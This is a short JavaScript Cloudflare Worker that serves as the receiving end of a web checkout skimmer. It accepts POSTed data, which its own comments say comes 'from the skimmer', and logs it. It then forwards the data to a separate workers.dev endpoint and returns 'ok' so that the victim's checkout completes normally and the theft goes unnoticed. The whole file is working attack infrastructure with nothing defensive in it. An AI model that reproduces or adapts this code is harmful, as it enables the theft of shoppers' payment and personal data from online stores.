export default {
  async fetch(request, env, ctx) {
    // Handle CORS Preflight requests
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: {
          "access-control-allow-origin": "*",
          "access-control-allow-methods": "POST, GET, OPTIONS",
          "access-control-allow-headers": "Content-Type",
          "access-control-max-age": "86400",
        },
      });
    }

    if (request.method === "POST") {
      try {
        // 1. Read the raw body as text (this preserves the exact JSON sent by the skimmer)
        const rawBody = await request.text();
        
        // 2. Log it to Cloudflare Logs (so you can see it in the dashboard if needed)
        console.log("SKIMMER_DATA:", rawBody);

        // 3. Send the data to YOUR endpoint
        const response = await fetch("https://chanfana-openapi-template.joshmccallister1986.workers.dev", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: rawBody,
        });

        // 4. Return a success response to the customer so their checkout completes normally
        return new Response(JSON.stringify({ status: "ok" }), {
          headers: { 
            "content-type": "application/json",
            "access-control-allow-origin": "*"
          },
        });
      } catch (error) {
        console.error("SKIMMER_ERROR:", error.message);
        return new Response(JSON.stringify({ error: "Internal Server Error" }), { status: 500 });
      }
    }
    
    // Handle GET requests
    return new Response("OK");
  },
};
